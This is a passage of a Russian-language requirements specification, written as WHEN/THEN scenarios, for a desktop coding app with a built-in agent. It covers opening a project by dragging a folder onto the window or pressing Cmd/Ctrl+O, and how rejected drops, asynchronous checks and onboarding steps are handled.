- **Поздний результат.** Проверка вида асинхронна. Если пока она идёт, пользователь выбрал проект другим явным действием («Open folder…», Cmd/Ctrl+O, недавний проект, «New session» с выбором папки) или app закрывает рабочее место, результат броска SHALL отбрасываться: проект не меняется, текст отказа не показывается. Восстановление проекта прошлого запуска бросок не отменяет: бросок — более позднее явное намерение пользователя.

#### Scenario: Брошенная папка открывает проект
- **WHEN** проект не выбран, профиль окна — встроенный агент, и пользователь бросает на экран папку `/work/app`
- **THEN** выбран проект `/work/app`, он первый в недавних, открыватель встроенного агента вызван ровно один раз с папкой `/work/app`, отправлен `session/list`, `session/new` не отправлен, журнал содержит `project.drop` с `outcome: opened` без пути

#### Scenario: Файл отклоняется
- **WHEN** проект не выбран, и пользователь бросает файл `/work/app/README.md`
- **THEN** проект не выбран, агент не запущен, зона показывает `That's a file. Drop a folder to open it as a project.`, диагностика содержит `Dropped item rejected (not_a_folder): /work/app/README.md.` уровня `warning`, событие `project.drop` содержит `reason: not_a_folder` и не содержит пути

#### Scenario: Несколько элементов отклоняются
- **WHEN** проект не выбран, и пользователь бросает сразу папки `/work/a` и `/work/b`
- **THEN** ни одна папка не выбрана проектом, агент не запущен, зона показывает `Drop one folder at a time.`, событие `project.drop` содержит `reason: multiple` и `count: 2`

#### Scenario: Пропавший путь
- **WHEN** проект не выбран, и пользователь бросает элемент `/work/gone`, которого к моменту проверки нет на диске
- **THEN** проект не выбран, агент не запущен, зона показывает `The dropped item no longer exists: /work/gone.`

#### Scenario: Элемент без локального пути
- **WHEN** проект не выбран, и плагин передал брошенный элемент без локального пути
- **THEN** проект не выбран, зона показывает `This item can't be opened as a project. Drop a folder from your file system.`, событие `project.drop` содержит `reason: unsupported`

#### Scenario: Ссылка вместо папки
- **WHEN** проект не выбран, и плагин передал брошенный элемент с «путём» `https://user:token@example.com/repo`
- **THEN** проект не выбран, агент не запущен, вид пути не проверялся, зона показывает `This item can't be opened as a project. Drop a folder from your file system.`, диагностика содержит `Dropped item rejected (unsupported).` уровня `warning`, событие `project.drop` содержит `reason: unsupported`; строки `user`, `token` и `example.com` нет ни в состоянии отказа, ни на экране, ни в диагностике, ни в журнале

#### Scenario: Относительный путь отклоняется
- **WHEN** проект не выбран, и плагин передал брошенный элемент с путём `work/app`
- **THEN** проект не выбран, вид пути не проверялся, зона показывает текст `unsupported`, а диагностика — `Dropped item rejected (unsupported).` без пути

#### Scenario: Выделение зоны и сброс отказа
- **WHEN** зона показывает текст отказа, и пользователь снова наводит перетаскиваемый элемент на экран
- **THEN** текст отказа скрыт, зона выделена; когда элемент уходит с экрана без броска, выделение снято, а проект не выбран

#### Scenario: Папка исчезла после проверки вида
- **WHEN** брошенная папка `/work/app` прошла проверку вида, но удалена до старта встроенного агента
- **THEN** агент не стартует, диагностика содержит `Project folder not found: /work/app. Choose an existing folder with Open folder….` уровня `error` с источником `project`, как при выборе этой папки в «Open folder…»

#### Scenario: Другой выбор во время проверки
- **WHEN** проект не выбран, пользователь бросает папку `/work/a`, и пока идёт проверка её вида, выбирает `/work/b` в «Open folder…»
- **THEN** выбран проект `/work/b`, агент стартовал один раз с папкой `/work/b`, текста отказа нет, `/work/a` проектом не выбран

#### Scenario: Символическая ссылка на папку
- **WHEN** проект не выбран, и пользователь бросает `/work/link`, символическую ссылку на папку `/srv/app`
- **THEN** выбран проект `/work/link` — путь, как его отдала ОС

#### Scenario: Пакет macOS принимается как папка
- **WHEN** проект не выбран, платформа — macOS, и пользователь бросает пакет `/Applications/Foo.app`
- **THEN** выбран проект `/Applications/Foo.app`, текста отказа нет, журнал содержит `project.drop` с `outcome: opened`

### Requirement: Cmd/Ctrl+O открывает выбор папки
На рабочем месте сочетание Cmd/Ctrl+O (запись каталога `CodeLabShortcut.openFolder`; основной модификатор привязан и к Ctrl, и к ⌘ на всех платформах) SHALL открывать системный выбор папки, как «Open folder…» сайдбара (design.md change `add-empty-project-screen`, D7). Сочетание работает при любом состоянии соединения, с проектом и без него. Выбранная папка — выбор проекта (триггер 1 требования «Агент стартует сам»), закрытый без выбора диалог ничего не меняет. На шаге onboarding «Open a project» сочетание SHALL открывать тот же системный выбор папки по правилам spec app-onboarding «Шаг «Open a project»»; на остальных шагах onboarding и в настройках сочетание ничего не делает (design.md change `add-onboarding-project-step`, D7).

Пока открыт выбор папки, запрошенный app, повторный запрос («Open folder…», Cmd/Ctrl+O, «New session» без проекта) НЕ SHALL открывать второй диалог. Подсказки сочетания у «Open folder…» на экране без проекта и в сайдбаре SHALL браться из той же записи каталога для платформы.

#### Scenario: Ctrl+O без проекта
- **WHEN** проект не выбран, платформа — Linux, и пользователь нажимает Ctrl+O
- **THEN** открывается системный выбор папки; после выбора `/work/app` агент профиля окна стартует в `/work/app`, `session/new` не отправлен

#### Scenario: ⌘O во время хода в другом проекте
- **WHEN** платформа — macOS, в сессии проекта `/work/a` идёт ход, и пользователь нажимает ⌘O и выбирает `/work/b`
- **THEN** выбран проект `/work/b`, агент не перезапущен, ход в `/work/a` продолжается

#### Scenario: Второй запрос при открытом диалоге
- **WHEN** выбор папки открыт по Ctrl+O, и, пока он открыт, срабатывают «Open folder…» и «New session» без проекта
- **THEN** порт выбора папки вызван один раз

#### Scenario: Сочетание в настройках
- **WHEN** открыты настройки, и пользователь нажимает Ctrl+O
- **THEN** выбор папки не открывается, проект не меняется

#### Scenario: Ctrl+O на шаге onboarding «Open a project»
- **WHEN** показан шаг onboarding «Open a project», платформа — Linux, и пользователь нажимает Ctrl+O и выбирает `/work/app`
- **THEN** открылся системный выбор папки; `/work/app` — выбранный проект, onboarding завершён, агент стартовал в `/work/app` только после перехода на рабочее место

#### Scenario: Ctrl+O на другом шаге onboarding
- **WHEN** показан шаг onboarding «Privacy», и пользователь нажимает Ctrl+O
- **THEN** выбор папки не открывается, проект не меняется

